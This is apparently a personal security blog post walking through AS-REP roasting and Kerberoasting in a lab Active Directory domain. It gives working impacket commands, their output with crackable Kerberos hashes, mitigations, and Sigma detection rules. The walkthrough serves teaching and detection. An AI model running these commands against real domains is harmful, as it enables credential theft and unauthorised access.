---
layout:	post
title:  "AD Post-Attacks: Ticket-Stealing Attacks"
date:   2024-07-25 11:11:11 +0200
categories: [Active Directory]
tags: [Active Directory]
---

## Pre-requisites

[AD: Fundamentals (venuschhantel.com.np)](https://venuschhantel.com.np/posts/AD_Fundamentals/)

[AD: Kerberos Authentication (venuschhantel.com.np)](https://venuschhantel.com.np/posts/AD_Kerberos_Authentication/)

<br>

## AD Environment

The AD environment for the ticket-stealing attacks (AS-REP roasting & Kerberoasting)walkthrough is illustrated in the image below.

![AD Environment](/images/2024-07-25-AD_Post_Attacks_Ticket_Stealing_Attacks/1.png)

<br>

## AS-REP Roasting

### Pre-authentication

If you follow my [Kerberos Authentication](https://venuschhantel.com.np/posts/AD_Kerberos_Authentication/) blog, then at Step 1, I had mentioned about pre-authentication. 

When pre-authentication is not enabled for any user, then that user will send unencrypted message to AS. And this is the misconfiguration flaw that can be exploited by attackers. 

Since the message is unencrypted, attacker can directly send request to AS for any user. The reply that it received from AS at Step 2 has one of the message encrypted with that user’s secret, which attacker will obtain and they can crack it offline. 

<br>

### AS-REP Roasting Walkthrough

To perform this attack, pre-authentication was disabled for ‘ape’ user as can be seen below.

![Disable pre-authentication](/images/2024-07-25-AD_Post_Attacks_Ticket_Stealing_Attacks/2.png)

After this, TGT ticket was requested from ‘hecker’ machine for ape user with the command below.

```bash
impacket-GetNPUsers APEWITHINTERNET.local/ape -dc-ip=192.168.190.130 -no-pass
```

```bash
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for ape
$krb5asrep$23$ape@APEWITHINTERNET.LOCAL:7076fed4d473e0fac7844a4ee4e861bb$6c3dd0bd8ff20bdcea45a8eddd8b9e4e9ed04fc64256ad84cbb920a2379a714f7c12413d6aa7f434fcab5f6df96ef3a3439c981682d98d374bed888e843c913cce3bf870f9eb29a1c4c16c562d7a7c1ea8040b1be136ade2c7f0a0e96d760333e9d12eae961131173a5de4a6fcb657fa6981c34134196a16c62af58a588d87938ec3c2801f4ce1b1784598b47d5c059efa1486e7e9adb34ecca1924735340dfee988033f21b99e552bbc61ca8071338dace8ff2a78e17db363c755dd0790c444c479096e8ddd6f7d996cf7b6563a83a8bb91492a239dc268d135b9f7dfec79f316532ad299cb074a343abee17e6d7a685007fa834c4cadedb0565b07c1fc
```

The obtained hash of ape user can be cracked offline.

<br>

### Mitigations

- Enable pre-authentication for all users.
- Enforce strong complex password and regularly rotate passwords.

<br>

### Detection: Sigma

```yml
title: AS-REP Roasting Attempt Detected
status: experimental
description: Detects AS-REP Roasting
references:
    - 
author: Venus Chhantel
date: 2024/07/25
tags:
    - attack.execution
    - attack.T1558
logsource:
    category: security
    product: windows
detection:
    selection:
        eventID: '4768'
        encryptionType: '0x17'
        preAuthenticationType: '0'
    exclude_selection:
        accountName|endswith: '$'
    condition: selection and not exclude_selection
falsepositives:
    - low
level: high
```

<br>

## Kerberoasting Roasting

### Kerberoasting

If you follow my [Kerberos Authentication](https://venuschhantel.com.np/posts/AD_Kerberos_Authentication/) blog, then at Step 4, the TGS send Service Ticket to user after validating. The Service Ticket is encrypted with service secret which is derived from service account password associated with a SPN.

If attacker gain acces of any domain user, they can request for Service Ticket. Through this, attacker will obtain the hash of service account password.

<br>

### Kerberoasting Walkthrough

For the walkthrough, the ‘ape’ user is considered already compromised. From ‘hecker’ machine using the ape user, Service Ticket was requested with the command below.  

```bash
sudo GetUserSPNs.py APEWITHINTERNET.local/ape:not@pe@123 -dc-ip 192.168.190.130 -request
```

```bash
ServicePrincipalName                       Name        MemberOf                                                              PasswordLastSet             LastLogon  Delegation 
-----------------------------------------  ----------  --------------------------------------------------------------------  --------------------------  ---------  ----------
DC/SQLService.APEWITHINTERNET.local:60111  SQLService  CN=Group Policy Creator Owners,OU=Groups,DC=APEWITHINTERNET,DC=local  2024-07-19 16:30:58.671460  <never>               

$krb5tgs$23$*SQLService$APEWITHINTERNET.LOCAL$APEWITHINTERNET.local/SQLService*$6937803672292e8d9a49eb6b4b8fb54a$163784e893b0305202bc1b945c25ed19e5cd978a236d653cb5c20682e511ed17bd8aa2f6b5913cc0d8386b12d2ac5284b9481f33d417cce93e8edaec86479ec4a0a5488e35d288201f23e368d98d3b5d8bf86f253b37e8fdc2db419d61acc44dcf606d98ff148889dc6d6d54bc730959dc18da535f309f16ee4a89ef012da389c180b6318e4afc3dfe6743e2c799c58123cc2d78de16465941ef750f81adf3d5cbbcfe28106eca55b4de120c66b2e6aef35148fcd1917789c83341298ea9e2610bcc45c0a134731549de81fe1226a31fd54e6dfb72e9109b19a14312795bfc45d6aa2aa647fa1c0889e263665fd90f62a635db21dd715df486c759db189e30c7cb42ab567fbf57a7fa753eb50617b3242527c52af92cd7aa37194c188a344983c1312cca797b2afd7563870c3c9c75d2873410c0d8aac95f52e3949246b65f12b4bd05436a7b1e46c6db22e6aa7b25f3f5353503e29f1a1f6c8104c7c9e590c34b42b8b7ebef4d3124bd1e936075fef8538082f54391c40227f6eeed4d28b14a46bfb0680ef2f2543ad5cb8dd7e3481d3a7dbe9e2c211a623def8ec370de9b7818fad347e5dd6d0088c35d602a008e97ef09aa428f0531f5bf8568ddd5821345e0f9e9c72dbfbdc8f1fd1fa9754594408960ed6a18c735f09a10068e67a63c48de7198d0e5d3bebb2498e06722f97dd78c3500dbf1c572ff33ba75f91a5821c4ac096607bcc3f5f30d61862f0eb9a041451cf180d6c6b77471ca1c60467a4d5787fd8a74d079e2d543e06cf5c21103e94a760c5dc9d3ddc1fb648484f9e3cb8aec22e1609b5ea0a1fc50d08f211d838acc1ed85903be60204019b1122217801ece8d44c78898a403e60e152c0eba64a2ccfd7a1dd043055ba4c77b3f977465fd474674224b08c8ed5aa9c21a64995287a6838e6f2cd36e190ad8570573a718a7e17d4eb5a3b10af58d0549a1290e0b8b687731baf17ae249211e6121d09f65fba02b74c4e4c2615f7f27b38c0b0171e1b58a174e1d1ae1862108e8d9f88000e514dcdcaea2f8a8d7e5d2d7de7f2cfbbc3bed2f17eb3a6b3f2b6aa1b39547e740eebebd2718364a6584b4fe8bf87deafa974cc3312e88900b67fd37f7eee3c9a156f9aad8da395ab32b85ce70b1f4c2ae463244a24dfcecd4079c24f51dcddecdd1a3351cbb67f3f1b26629a1159f403cd9d6cc141fe672e88269d7c4acb870dc054be51bfef1c55bfbedd51eddb4ba1c826430d1b5d17473422314c8f00116cf2cbd2c8778bad9379ffa82d5e6acf2d94f6f7f03ddf66161bbae80d1bfd4117bd4331605f8a0edd5e88bc1a318e12c084445f963baca11db6676f7b2c07d426b87986d4edecc8c630e03a072a97b37174f8a946d8c598f8a1f06877bfabca0ea844e7370c8d87a0e761841e33a0fd021dcfd052d4e35aab3bf0562389884b8ddec3a1c504470626dcadb58b233f0a359e86fab1a2a110931a791bba951ad935e8dc2fcdb9b6d9cb818618ce280a65fbc84aba837db86d1506984f74d79fca7db068e0e95c28d3d69e95f044968521dfe78
```

The obtained hash of service account can be cracked offline.

<br>

### Mitigations

- Enforce strong complex password for service accounts.
- Use gMSA (Group Managed Service Accounts).
- Follow principle of least privilege.

<br>

### Detection: Sigma

```yml
title: Detect Kerberoasting
status: experimental
description: Detects Kerberoasting
references:
    - 
author: Venus Chhantel
date: 2024/07/25
tags:
    - attack.execution
    - attack.T1558
logsource:
    category: security
    product: windows
detection:
    selection:
        eventID: '4769'
        encryptionType: '0x17'
    exclude_selection:
        accountName|endswith: '$'
        serviceName: 'krbtgt'
    condition: selection and not exclude_selection
falsepositives:
    - low
level: high
```
